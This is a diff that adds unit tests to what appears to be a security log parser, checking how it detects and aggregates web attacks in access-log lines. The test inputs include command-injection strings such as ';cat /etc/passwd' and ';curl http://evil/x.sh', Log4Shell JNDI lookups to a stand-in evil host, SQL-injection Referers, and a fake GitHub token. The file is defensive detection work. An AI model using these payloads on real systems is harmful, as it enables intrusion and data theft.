@@ -309,3 +309,187 @@ describe("parseCombinedLog — IOC provenance", () => {
     expect(parseCombinedLog(`${a}\n${b}`).events).toHaveLength(2);
   });
 });
+
+// #930 item 3 — web request decoding. A request target arrives encoded; the attack shapes fire on
+// the DECODED text, the row is graded Medium + T1190, the description takes a fixed-slot layout so
+// no attacker-controlled field can push the evidence past the clip, and the aggregation key gains
+// the families plus a digest of the matched text so two payloads on one path are two rows.
+describe("mapCombinedLogLine — web attack shapes (#930 item 3)", () => {
+  // Assembled at runtime so no full-length token shape appears in source (secretSpillRules.test.ts).
+  const GH_PAT = ["ghp", "_", "EvidenceForgeFake0Yl4nQxsCkGvHzTbWpF"].join("");
+  const line = (uri: string, status = 200, referer = "-", ua = "curl/8") =>
+    `10.66.20.30 - - [16/May/2024:13:59:31 +0000] "GET ${uri} HTTP/1.1" ${status} 512 "${referer}" "${ua}"`;
+  const map = (l: string) => mapCombinedLogLine(l, new Map<string, SiemIoc>())!;
+
+  it("decodes the target, grades the attack Medium + T1190 and puts the evidence first", () => {
+    const e = map(line("/index.php?cmd=%3Bcat%20/etc/passwd"));
+    expect(e.severity).toBe("Medium");
+    expect(e.mitre).toContain("T1190");
+    expect(e.description).toMatch(
+      /^\[web-attack: cmd\] \[status: 200\] \[match: ";cat \/etc\/passwd"\] GET \/index\.php\?cmd=%3Bcat%20\/etc\/passwd/,
+    );
+  });
+
+  it("keeps a row with no signal byte-for-byte as before", () => {
+    const e = map(line("/dashboard?page=2"));
+    expect(e.severity).toBe("Info");
+    expect(e.description).toBe("GET /dashboard?page=2 -> 200 (512b) (ua curl/8)");
+  });
+
+  it("does not aggregate an attack line with a benign line on the same path", () => {
+    const attack = map(line("/index.php?cmd=%3Bid"));
+    const benign = map(line("/index.php?page=2"));
+    expect(attack.aggKey).not.toBe(benign.aggKey);
+    expect(benign.aggKey).not.toContain("attack:");
+  });
+
+  it("keeps two same-family payloads on one path as two rows, in either order", () => {
+    const a = map(line("/index.php?cmd=%3Bid"));
+    const b = map(line("/index.php?cmd=%3Bcurl%20http://evil/x.sh"));
+    expect(a.aggKey).not.toBe(b.aggKey);
+    // the same payload with different padding is one row
+    const c = map(line("/index.php?cmd=%3Bid&pad=zzz"));
+    expect(c.aggKey).toBe(a.aggKey);
+  });
+
+  it("shows the prefix and the status even when the target is 700 characters long", () => {
+    const e = map(line(`/index.php?pad=${"a".repeat(650)}&cmd=%3Bid`));
+    expect(e.description.startsWith('[web-attack: cmd] [status: 200] [match: ";id"]')).toBe(true);
+    expect(e.description.length).toBeLessThanOrEqual(600);
+  });
+
+  it("finds a payload placed past character 200 of the target and shows it in the match slot", () => {
+    const e = map(line(`/index.php?pad=${"a".repeat(300)}&cmd=%3Bwhoami`));
+    expect(e.description).toContain('[match: ";whoami"]');
+  });
+
+  it("fires on the User-Agent and on the Referer, and names the field", () => {
+    const ua = map(line("/", 200, "-", "${jndi:ldap://evil.example.invalid/a}"));
+    expect(ua.severity).toBe("Medium");
+    expect(ua.mitre).toContain("T1190");
+    expect(ua.description).toMatch(/^\[web-attack: expression@ua\] \[status: 200\] \[match: ua:"\$\{jndi:/);
+    const ref = map(line("/", 200, "https://portal.example.invalid/?id=1%27%20or%201%3D1--"));
+    expect(ref.description).toMatch(/^\[web-attack: sqli@referer\]/);
+  });
+
+  it("sees a payload after an escaped quote in the User-Agent or the Referer", () => {
+    const ua = map(line("/", 200, "-", 'Mozilla/5.0 \\" ${jndi:ldap://evil.example.invalid/a}'));
+    expect(ua.description).toMatch(/^\[web-attack: expression@ua\]/);
+    const ref = map(line("/", 200, 'https://a.example.invalid/?q=\\" ${jndi:ldap://evil.example.invalid/a}'));
+    expect(ref.description).toMatch(/^\[web-attack: expression@referer\]/);
+  });
+
+  it("still parses a line with fields after the User-Agent", () => {
+    const e = mapCombinedLogLine(`${line("/x")} "1.2.3.4" 0.012`, new Map<string, SiemIoc>());
+    expect(e?.description).toContain("GET /x");
+  });
+
+  it("carries both discriminators when a spill and an attack sit on one line", () => {
+    const e = map(line(`/cb?token=${GH_PAT}&cmd=%3Bid`));
+    expect(e.severity).toBe("Medium");
+    expect(e.mitre).toEqual(expect.arrayContaining(["T1552.001", "T1190"]));
+    expect(e.aggKey).toContain("spill:");
+    expect(e.aggKey).toContain("attack:");
+  });
+
+  it("finds a spill hidden behind encoding", () => {
+    const e = map(line(`/cb?token=${GH_PAT.replace("_", "%5F")}`));
+    expect(e.mitre).toContain("T1552.001");
+  });
+
+  it("renders a decoded control character as a visible escape, never as the byte", () => {
+    const e = map(line("/x?q=%3Bcurl%20http://evil.example.invalid/a%00b"));
+    expect(e.description).toContain("\\x00");
+    expect(e.description).not.toMatch(/\x00/);
+  });
+
+  it("reports an oversized field instead of inspecting a prefix of it", () => {
+    const sink = new Map<string, SiemIoc>();
+    const big = `/x?pad=${"a".repeat(65_540)}&cmd=%3Bid`;
+    const e = mapCombinedLogLine(line(big), sink)!;
+    expect(e.severity).toBe("Medium");
+    expect(e.description).toMatch(/^\[web-attack: oversized@target \(65\d{3} chars, not inspected\)\]/);
+    expect(e.description).not.toContain('[match: ";id"]'); // the payload was NOT scanned — the bound is real
+    const bigRef = mapCombinedLogLine(
+      line("/", 200, `https://r.example.invalid/?p=${"b".repeat(70_000)}`),
+      sink,
+    )!;
+    expect(bigRef.description).toMatch(/oversized@referer/);
+    const urlIoc = [...sink.values()].find(
+      (i) => i.type === "url" && i.value.startsWith("https://r.example.invalid"),
+    );
+    expect(urlIoc!.value.length).toBeLessThanOrEqual(65_536);
+  });
+});
+
+describe("parseCombinedLog — attack-variant bound per path", () => {
+  const line = (uri: string, referer = "-", ua = "curl/8") =>
+    `10.66.20.30 - - [16/May/2024:13:59:31 +0000] "GET ${uri} HTTP/1.1" 200 512 "${referer}" "${ua}"`;
+  const distinct = (n: number, uri: (i: number) => string) =>
+    Array.from({ length: n }, (_, i) => line(uri(i))).join("\n");
+
+  it("keeps the first 64 distinct payloads on a path and folds the rest into one overflow row", () => {
+    const r = parseCombinedLog(
+      distinct(1000, (i) => `/index.php?cmd=%3Bcurl%20http://evil/${i}`),
+      { maxEvents: 5000 },
+    );
+    expect(r.events).toHaveLength(65);
+    const overflow = r.events.find((e) => e.description.includes("[overflow:"))!;
+    expect(overflow.count).toBe(936);
+    expect(overflow.description).toMatch(
+      /^\[web-attack: cmd\] \[overflow: distinct payloads beyond 64 on this path folded\]/,
+    );
+    expect(overflow.severity).toBe("Medium");
+  });
+
+  it("names the complete family union on the overflow row when families and fields rotate", () => {
+    const rows = Array.from({ length: 1000 }, (_, i) => {
+      const k = i % 3;
+      if (k === 0) return line(`/index.php?cmd=%3Bcurl%20http://evil/${i}`);
+      if (k === 1)
+        return line(`/index.php?x=${i}`, `https://r.example.invalid/?id=1%27%20or%20${i}%3D${i}--`);
+      return line(`/index.php?x=${i}`, "-", `\${jndi:ldap://evil.example.invalid/${i}}`);
+    }).join("\n");
+    const r = parseCombinedLog(rows, { maxEvents: 5000 });
+    expect(r.events).toHaveLength(65);
+    const overflow = r.events.find((e) => e.description.includes("[overflow:"))!;
+    expect(overflow.description).toMatch(/^\[web-attack: cmd,expression@ua,sqli@referer\] \[overflow:/);
+  });
+
+  it("keeps IOC provenance pointing at the overflow row, not at a key that no longer exists", () => {
+    // The attack and the IOC both ride in the Referer: its host is a domain IOC, its query fires sqli.
+    const rows = Array.from({ length: 100 }, (_, i) =>
+      line("/index.php", `https://evil${i}.example.invalid/?id=1%27%20or%20${i}%3D${i}--`),
+    ).join("\n");
+    const r = parseCombinedLog(rows, { maxEvents: 5000 });
+    const overflow = r.events.find((e) => e.description.includes("[overflow:"))!;
+    // A domain IOC from an overflowed row (i >= 64) is attributed to the overflow row's key, which
+    // resolveExtractedFrom can match — the original key no longer names any event.
+    const late = r.iocs.find((i) => i.value === "evil90.example.invalid")!;
+    expect(late.sourceAggKeys).toEqual([overflow.aggKey]);
+    const early = r.iocs.find((i) => i.value === "evil3.example.invalid")!;
+    expect(early.sourceAggKeys).not.toEqual([overflow.aggKey]);
+  });
+
+  it("does not fold variants when aggregation is off — every payload stays its own row", () => {
+    const r = parseCombinedLog(
+      distinct(66, (i) => `/index.php?cmd=%3Bcurl%20http://evil/${i}`),
+      {
+        aggregate: false,
+        maxEvents: 5000,
+      },
+    );
+    expect(r.events).toHaveLength(66);
+    expect(
+      r.events.every((e) => e.description.includes("[match:") && !e.description.includes("[overflow:")),
+    ).toBe(true);
+  });
+
+  it("bounds per path, not globally — a thousand paths are a thousand rows", () => {
+    const r = parseCombinedLog(
+      distinct(1000, (i) => `/p${i}?cmd=%3Bid`),
+      { maxEvents: 5000 },
+    );
+    expect(r.events).toHaveLength(1000);
+  });
+});
